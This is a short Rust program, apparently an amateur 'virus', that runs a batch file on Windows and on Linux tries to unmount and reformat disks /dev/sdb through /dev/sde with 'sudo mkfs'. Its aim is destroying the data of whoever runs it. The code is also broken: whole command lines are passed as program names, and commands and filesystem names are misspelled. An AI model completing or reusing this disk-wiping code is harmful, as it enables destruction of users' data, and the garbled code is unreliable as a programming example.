// https://github.com/zxcV32/unlimited-folders-on-windows-desktop/blob/master/virus.bat

use std::process::Command;
 

fn main() {
    if cfg!(target_os = "windows") {
        println!("Running on Windows!");
        
        // need to echo Hello From echotest.bat >> ./init.bat
        // FTP or SSH file transfer
        let _ = Command::new("cmd")
            .args(&["/C", "./init.bat"])
            .output()
            .expect("failed to execute process");

    } else if cfg!(target_os = "linux") {
        println!("Running on Linux!");
        // mounted disk can't write. Its always busy. So I choose to unmounte some Mounted disk and
        // "lsblk -f"

        let output= Command::new("umout /dev/sdb")
            .output()
            .expect("Filed");
        let output= Command::new("umout /dev/sdc")
            .output()
            .expect("Filed");
        let output= Command::new("umout /dev/sdd")
            .output()
            .expect("Filed");
        let output= Command::new("umout /dev/sde")
            .output()
            .expect("Filed");

        // output.status.success()

        // do reformat that
        let output= Command::new("sudo mkfs -t ex4 /dev/sdb")
            .output()
            .expect("Filed");
        let output= Command::new("sudo mkfs -t ex4 /dev/sdc")
            .output()
            .expect("Filed");
        let output= Command::new("sudo mkfs -t ex4 /dev/sdd")
            .output()
            .expect("Filed");
        let output= Command::new("sudo mkfs -t ex4 /dev/sde")
            .output()
            .expect("Filed");

        // rust lang String handling way is so hard to me :(
    } else {
        println!("Running on an unsupported OS!");
    }
}

